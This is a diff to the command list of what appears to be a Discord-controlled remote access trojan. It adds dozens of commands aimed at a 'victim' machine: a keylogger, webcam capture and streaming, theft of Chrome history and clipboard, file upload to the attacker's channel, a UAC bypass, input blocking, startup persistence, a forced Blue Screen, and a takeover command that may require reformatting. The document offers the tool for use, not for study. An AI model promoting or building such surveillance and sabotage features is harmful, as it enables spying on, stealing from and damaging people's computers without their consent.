@@ -4,7 +4,7 @@ find these lines
 loop.create_task(DisFunc.start('your token here'))
   channel = DisFunc.get_channel()  # Replace with your desired channel ID 
 
-commands :
+old commands :
     ?ps <command> same as cmd but powershell 
     ?cmd <command> - Execute a command.
     ?upload <path> <channel_id> - Upload a file from victim to the specified channel cannot accept spaces.
@@ -16,6 +16,45 @@ commands :
     ?ahah bu ahlayan kadın sesi türklere özel :D
     ?download download file from link
     ?website https://example.com/: Sends the user to a website of choice
-
+new commands :
+     ?admincheck checks if admin
+?history - Gets the Chrome browsing history
+?ps <command> - Runs a command in PowerShell
+?cmd <command> - Executes a command (only `whoami` command works)
+?upload <path> <channel_id> - Uploads a file from victim's machine to the specified channel
+?nano <filepath> - Writes contents to a file using nano editor
+?screenshot - Gets a screenshot of the victim's computer
+?furryporn - Views furry pornography (not recommended)
+?rickroll - Plays the "Never Gonna Give You Up" song by Rick Astley (not recommended)
+?usage - Shows CPU and RAM usage of the victim's machine
+?ahah - Plays a special sound for Turkish people
+?download <link> - Downloads a file from a URL
+?website <url> - Opens a website of choice
+?execpy <python command> - Executes a Python command provided by the user
+?execpyfile - Executes a provided .py file
+?execbat <executable .bat file> - Executes a provided .bat file
+?sysinfo - Shows system information of the victim's machine
+?cd - Changes the current directory (usage: cd C:\ - use two backslashes instead of one)
+?webcam - Captures an image from the victim's webcam
+?hide - Hides a specified .exe or .py file
+?unhide - Unhides a specified .exe or .py file
+?streamwebcam - Streams the victim's webcam (may be glitchy)
+?stopwebcam - Stops streaming the victim's webcam
+?takeovercomputer - Takes over the victim's machine, blocks keyboard and mouse input, adds program to startup, and executes a command that may require the victim to fully format their machine [its still on develop]
+?unblockinput - Unblocks input on the victim's machine
+?blockinput - Blocks input on the victim's machine (mouse, keyboard, etc.)
+?clipboard - Shows the contents of the victim's clipboard
+?bluescreen - Shows Blue Screen of Death (BSOD) not fake its real
+?blockcmd - Kills cmd.exe even if it's running as an administrator
+?unblockcmd - Unblocks cmd.exe
+?hideexecpyfile <attached file> - Hides
+?startkeylogger - Starts recording keystrokes (use ?dumpkeylogger to get the keylog after stopping the keylogger)
+?stopkeylogger - Stops recording keystrokes
+?dumpkeylogger - Provides the recorded keylog while the keylogger was running
+?voice <anything to say> - Makes the victim's machine say something
+?message <your message> - Sends an error message to the victim
+?uacbypass - Attempts to bypass User Account Control (UAC) to gain administrator privileges (may be detected by antivirus software)
+?askadmin - Asks the victim for administrator privileges and opens a terminal if accepted (not recommended a provided .py file (only works on administrator accounts)
+?record - Records the victim's voice)
 
     credit to : https://github.com/syntheticlol
